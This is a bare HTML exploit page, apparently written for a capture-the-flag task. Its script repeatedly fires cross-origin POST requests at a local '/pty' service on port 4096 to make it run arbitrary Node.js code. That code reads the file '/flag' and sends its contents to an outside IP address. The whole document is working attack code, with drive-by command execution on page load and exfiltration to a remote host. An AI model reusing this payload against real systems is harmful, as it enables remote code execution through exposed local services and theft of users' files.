  <!doctype html>
  <meta charset="utf-8">
  <script>
  const WEBHOOK = "http://47.118.30.30:9999";

  const nodeCode = `
  (async () => {
    const fs = require("fs");
    try { fs.chmodSync("/flag", 0o644); } catch {}
    let out = "";
    try { out = fs.readFileSync("/flag", "utf8"); }
    catch (e) { out = "ERR:" + String(e); }
    try {
      await fetch(${JSON.stringify("http://47.118.30.30:9999")}, {
        method: "POST",
        body: out
      });
    } catch {}
    process.exit(0);
  })();
  `;

  const body = JSON.stringify({
    command: "node",
    args: ["-e", nodeCode],
    cwd: "/"
  });

  async function fire(base) {
    try {
      await fetch(base + "/pty", {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "text/plain;charset=UTF-8" },
        body
      });
    } catch {}
  }

  (async () => {
    const end = Date.now() + 15000;
    while (Date.now() < end) {
      await fire("http://127.0.0.1:4096");
      await fire("http://localhost:4096");
      await new Promise(r => setTimeout(r, 300));
    }
  })();
  </script>
